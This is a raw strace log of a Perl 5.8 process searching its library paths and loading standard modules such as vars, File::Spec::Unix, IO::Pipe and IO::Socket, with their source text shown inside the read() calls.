6687  07:15:03.352865 stat64("/usr/lib/perl5/vars.pmc", 0xbfdad19c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352877 stat64("/usr/lib/perl5/vars.pm", 0xbfdad0ac) = -1 ENOENT (No such file or directory)
6687  07:15:03.352889 stat64("/usr/share/perl5/vars.pmc", 0xbfdad19c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352901 stat64("/usr/share/perl5/vars.pm", 0xbfdad0ac) = -1 ENOENT (No such file or directory)
6687  07:15:03.352914 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbfdad19c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352926 stat64("/usr/lib/perl/5.8/vars.pm", 0xbfdad0ac) = -1 ENOENT (No such file or directory)
6687  07:15:03.352940 stat64("/usr/share/perl/5.8/vars.pmc", 0xbfdad19c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352952 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
6687  07:15:03.352972 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
6687  07:15:03.352986 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdaceb8) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.352997 _llseek(10, 0, [0], SEEK_CUR) = 0
6687  07:15:03.353015 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
6687  07:15:03.353132 stat64("/etc/perl/warnings/register.pmc", 0xbfdaccec) = -1 ENOENT (No such file or directory)
6687  07:15:03.353147 stat64("/etc/perl/warnings/register.pm", 0xbfdacbfc) = -1 ENOENT (No such file or directory)
6687  07:15:03.353160 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbfdaccec) = -1 ENOENT (No such file or directory)
6687  07:15:03.353173 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbfdacbfc) = -1 ENOENT (No such file or directory)
6687  07:15:03.353188 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbfdaccec) = -1 ENOENT (No such file or directory)
6687  07:15:03.353201 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbfdacbfc) = -1 ENOENT (No such file or directory)
6687  07:15:03.353216 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbfdaccec) = -1 ENOENT (No such file or directory)
6687  07:15:03.353228 stat64("/usr/lib/perl5/warnings/register.pm", 0xbfdacbfc) = -1 ENOENT (No such file or directory)
6687  07:15:03.353242 stat64("/usr/share/perl5/warnings/register.pmc", 0xbfdaccec) = -1 ENOENT (No such file or directory)
6687  07:15:03.353284 stat64("/usr/share/perl5/warnings/register.pm", 0xbfdacbfc) = -1 ENOENT (No such file or directory)
6687  07:15:03.353302 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbfdaccec) = -1 ENOENT (No such file or directory)
6687  07:15:03.353330 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbfdacbfc) = -1 ENOENT (No such file or directory)
6687  07:15:03.353344 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbfdaccec) = -1 ENOENT (No such file or directory)
6687  07:15:03.353357 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
6687  07:15:03.353378 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
6687  07:15:03.353393 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdaca08) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.353404 _llseek(11, 0, [0], SEEK_CUR) = 0
6687  07:15:03.353423 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
6687  07:15:03.353569 read(11, "", 4096) = 0
6687  07:15:03.353582 close(11)         = 0
6687  07:15:03.353826 _llseek(10, 1148, [1148], SEEK_SET) = 0
6687  07:15:03.353843 _llseek(10, 0, [1148], SEEK_CUR) = 0
6687  07:15:03.353854 close(10)         = 0
6687  07:15:03.353922 _llseek(8, 594, [594], SEEK_SET) = 0
6687  07:15:03.353936 _llseek(8, 0, [594], SEEK_CUR) = 0
6687  07:15:03.353946 close(8)          = 0
6687  07:15:03.353979 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.353995 stat64("/etc/perl/File/Spec/Unix.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.354008 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.354026 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.354040 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.354053 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.354068 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.354080 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.354094 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.354107 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.354120 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.354133 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.354147 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.354160 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
6687  07:15:03.354182 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
6687  07:15:03.354198 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad368) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.354209 _llseek(8, 0, [0], SEEK_CUR) = 0
6687  07:15:03.354227 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
6687  07:15:03.354942 brk(0x8218000)    = 0x8218000
6687  07:15:03.355073 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
6687  07:15:03.355505 read(8, "", 4096) = 0
6687  07:15:03.355520 close(8)          = 0
6687  07:15:03.355712 read(6, "", 4096) = 0
6687  07:15:03.355727 close(6)          = 0
6687  07:15:03.355943 stat64("/etc/perl/IO/Pipe.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.355960 stat64("/etc/perl/IO/Pipe.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.355975 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.355988 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.356002 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.356014 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.356028 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.356040 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.356053 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.356065 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.356078 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.356091 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
6687  07:15:03.356112 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
6687  07:15:03.356128 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad818) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.356139 _llseek(6, 0, [0], SEEK_CUR) = 0
6687  07:15:03.356161 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
6687  07:15:03.356900 _llseek(6, 3425, [3425], SEEK_SET) = 0
6687  07:15:03.356919 _llseek(6, 0, [3425], SEEK_CUR) = 0
6687  07:15:03.356930 close(6)          = 0
6687  07:15:03.356954 stat64("/etc/perl/IO/Socket.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.356968 stat64("/etc/perl/IO/Socket.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.356982 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.356995 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.357009 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.357022 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.357036 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.357048 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.357061 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.357073 stat64("/usr/share/perl5/IO/Socket.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.357087 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.357099 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
6687  07:15:03.357121 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
6687  07:15:03.357139 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad818) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.357151 _llseek(6, 0, [0], SEEK_CUR) = 0
6687  07:15:03.357168 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
6687  07:15:03.357534 stat64("/etc/perl/Socket.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.357550 stat64("/etc/perl/Socket.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.357563 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
